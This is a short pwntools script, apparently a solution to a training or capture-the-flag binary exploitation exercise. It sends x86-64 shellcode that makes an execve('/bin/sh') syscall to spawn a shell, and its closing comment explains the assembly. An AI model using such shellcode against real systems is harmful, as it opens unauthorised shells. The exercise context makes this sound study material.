from pwn import *

SERVER = "bin.training.offdef.it"
PORT = 3001
BINARY = "./backtoshell"


if "REMOTE" in args:
    r = remote(SERVER, PORT)
else: 
    r = process(BINARY)
    gdb.attach(r, """
            #breakpoints
            b 0x401112
            """)
    input("wait")


#code
shellcode = b"\x48\x89\xC7\x48\x83\xC7\x10\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\0x00"
r.send(shellcode)
r.interactive()


#comment
'''
This shell code is basically a way to set the right registers for a 
execv system call. Obviously, it jumps at the end of the string where it
can find the "bin/sh" string, opening a new terminal. 

mov    rdi,rax
add    rdi,0x10
mov    rax,0x3b
syscall

after this "bin/sh"
'''